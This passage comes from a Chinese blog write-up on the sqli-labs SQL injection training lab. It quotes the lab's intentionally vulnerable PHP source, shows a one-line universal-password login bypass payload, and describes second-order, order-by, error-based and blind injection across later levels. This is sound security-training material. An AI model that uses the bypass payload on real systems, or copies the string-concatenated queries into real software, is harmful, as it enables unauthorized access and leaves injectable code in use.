&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span>  &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对 username 和 password 过滤不强<br>可通过万能密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p>登录<br>接下来通过修改密码界面二次注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;Auth&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>])) &#123;</span><br><span class="line">  		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	<span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	<span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);<span class="comment">//原密码 还是万能密码绕过</span></span><br><span class="line">	<span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);<span class="comment">//新密码</span></span><br><span class="line">	<span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">		<span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">		<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="comment">//echo &quot;Password successfully updated&quot;;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/password-updated.jpg&quot;&gt;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">			<span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">	<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>);</span><br><span class="line">	<span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他用户名通过 session 获取，所以无法更改其他用户</p><h2 id="order-by注入"><a class="markdownIt-Anchor" href="#order-by注入"></a> <code>order by注入</code></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br></pre></td></tr></table></figure><p>order by 与 where 差不多<br>但不同是 order by 不能使用 union 联合<br>其他都可 也比较灵活<br>从 46 到 53 关皆为 order by 注入</p><h2 id="限制次数的注入"><a class="markdownIt-Anchor" href="#限制次数的注入"></a> 限制次数的注入</h2><p>从 54 关开始，限制了注入次数<br>一旦超过次数就会改变数据<br>一切又要重新开始<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254167926-107.png" alt="在这里插入图片描述"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254169537-110.png" alt="在这里插入图片描述"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254171849-113.png" alt="在这里插入图片描述"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center-1689254174456-116.png" alt="在这里插入图片描述">58-62 可以报错注入<br>从 62 关开始只能使用盲注<br><code>id注入部分代码</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">id注入部分代码</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../sql-connections/sql-connect-1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../sql-connections/functions.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$pag</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]; /generating page address to piggy back after redirects...</span><br><span class="line"><span class="variable">$characters</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>; /characterset <span class="keyword">for</span> generating random data</span><br><span class="line"><span class="variable">$times</span>= <span class="number">10</span>;</span><br><span class="line"><span class="variable">$table</span> = <span class="title function_ invoke__">table_name</span>();</span><br><span class="line"><span class="variable">$col</span> = <span class="title function_ invoke__">column_name</span>(<span class="number">1</span>);     / session id column name</span><br><span class="line"><span class="variable">$col1</span> = <span class="title function_ invoke__">column_name</span>(<span class="number">2</span>);   /secret key column name</span><br><span class="line">/ Submitting the <span class="keyword">final</span> answer</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;answer_key&#x27;</span>]))&#123;</span><br><span class="line">	/ resetting the challenge <span class="keyword">and</span> repopulating the table .</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;reset&#x27;</span>]))&#123;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;challenge&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600000</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Redirecting you to main challenge page..........\n&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>( <span class="string">&quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=<span class="subst">$pag</span>&quot;</span> );</span><br><span class="line">		<span class="comment">//echo &quot;cookie expired&quot;;</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		/ Checking the cookie on the page <span class="keyword">and</span> populate the table with random value.</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;challenge&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$sessid</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;challenge&#x27;</span>];</span><br><span class="line">			<span class="comment">//echo &quot;Cookie value: &quot;.$sessid;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$expire</span> = <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">			<span class="variable">$hash</span> = <span class="title function_ invoke__">data</span>(<span class="variable">$table</span>,<span class="variable">$col</span>);</span><br><span class="line">			<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;challenge&quot;</span>, <span class="variable">$hash</span>, <span class="variable">$expire</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">		/take the variables</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">			/logging the connection parameters to a file <span class="keyword">for</span> analysis.</span><br><span class="line">			<span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">			/update the counter in database</span><br><span class="line">			<span class="title function_ invoke__">next_tryy</span>();</span><br><span class="line">			/Display attempts on screen.</span><br><span class="line">			<span class="variable">$tryyy</span> = <span class="title function_ invoke__">view_attempts</span>();</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;You have made : &quot;</span>. <span class="variable">$tryyy</span> .<span class="string">&quot; of <span class="subst">$times</span> attempts&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">		  /Reset the Database <span class="keyword">if</span> you exceed allowed attempts.</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$tryyy</span> &gt;= (<span class="variable">$times</span>+<span class="number">1</span>))&#123;</span><br><span class="line">				<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;challenge&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600000</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Redirecting you to challenge page..........\n&quot;</span>;</span><br><span class="line">				<span class="title function_ invoke__">header</span>( <span class="string">&quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=<span class="subst">$pag</span>&quot;</span> );</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		/ Querry DB to get the correct output</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">			<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#00FFFF&quot;&gt;&#x27;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//				print_r(mysql_error());</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;font color=&#x27;#00FFFF&#x27;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#x27;CHALLENGES&#x27;)&lt;/i&gt;&lt;/b&gt; in Less than <span class="subst">$times</span> attempts&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot;</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>答案提交部分</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">	<span class="variable">$key</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$key</span>);</span><br><span class="line">	<span class="comment">//echo $key;</span></span><br><span class="line">	/Query table to verify your result</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT 1 FROM <span class="subst">$table</span> WHERE <span class="subst">$col1</span>= &#x27;<span class="subst">$key</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="comment">//echo &quot;$sql&quot;;</span></span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error in submittion of Key Solution&quot;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>( <span class="string">&quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=<span class="subst">$pag</span>&quot;</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">header</span>( <span class="string">&quot;refresh:3;url=index.php&quot;</span> );</span><br><span class="line">		<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>sqli-lab</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://s1rius.space/2022/02/sqli-lab/">https://s1rius.space/2022/02/sqli-lab/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>s1rius</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-02-26</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-02-26</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/sql/">sql</a><a class="post-meta__tags" href="/tags/sqli-lab/">sqli-lab</a></div><div class="post-share"><div class="social-share" data-image="https://s1rius.space/img/cover/img_614_1403x992_500_null_normal.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css" media="print" onload='this.media="all"'><script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/custom/donate/WeChanQR.jpg" target="_blank"><img class="post-qr-code-img" src="/img/custom/donate/WeChanQR.jpg" alt="wechat"></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/custom/donate/AliPayQR.jpg" target="_blank"><img class="post-qr-code-img" src="/img/custom/donate/AliPayQR.jpg" alt="alipay"></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2022/03/upload-labs/" title="upload-labs"><img class="cover" src="https://s1rius.space/img/cover/img_514_1920x1080_72_null_normal.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">upload-labs</div></div><div class="info-2"><div class="info-item-1">pass-01 前端 js 过滤 123456789101112131415161718192021function checkFile() &#123; var file = document.getElementsByName(&quot;upload_file&quot;)[0].value; if (file == null || file == &quot;&quot;)...</div></div></div></a><a class="pagination-related" href="/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/" title="ctfhub-彩蛋"><img class="cover" src="https://s1rius.space/img/cover/img_413_1517x1053_96_null_normal.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ctfhub-彩蛋</div></div><div class="info-2"><div class="info-item-1">工具 彩蛋 一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页 抓包后发现不管哪一页 limit 都是 12 但 offset 在变化 于是 这样设置参数 在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包 在最后一行 首页 彩蛋 api中间框内隐藏着两行字 ctfhub{c18732f48a96c40d40a06e74b1305706} 题目入口...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2022/12/2022unctf%20wp/" title="2022 unctf wp"><img class="cover" src="https://s1rius.space/img/cover/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-31</div><div class="info-item-2">2022 unctf wp</div></div><div class="info-2"><div class="info-item-1">web 我太喜欢 bilibili 大学啦–中北大学 打开就一个 phpinfo 直接搜 flag 直出 虽然我是中北大学的，但这不是我们实验室出的题 略感离谱 签到-吉林警察学院 打开有行注释 以为拿来当用户名密码登录就完了来 结果只有个登录成功 假签到题 尝试使用其他用户名（规律：用户名=密码） 发现学号改一下会出现字符 再试试还有 开始爆破 burp 先设置最后一位为变量从...</div></div></div></a><a class="pagination-related" href="/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/" title="ctfhub-彩蛋"><img class="cover" src="https://s1rius.space/img/cover/img_413_1517x1053_96_null_normal.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-19</div><div class="info-item-2">ctfhub-彩蛋</div></div><div class="info-2"><div class="info-item-1">工具 彩蛋 一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页 抓包后发现不管哪一页 limit 都是 12 但 offset 在变化 于是 这样设置参数 在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包 在最后一行 首页 彩蛋 api中间框内隐藏着两行字 ctfhub{c18732f48a96c40d40a06e74b1305706} 题目入口...</div></div></div></a><a class="pagination-related" href="/2022/05/Bypass%20disable_function/" title="Bypass disable_function"><img class="cover" src="https://s1rius.space/img/cover/img_695_1200x812_96_null_normal.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-02</div><div class="info-item-2">Bypass disable_function</div></div><div 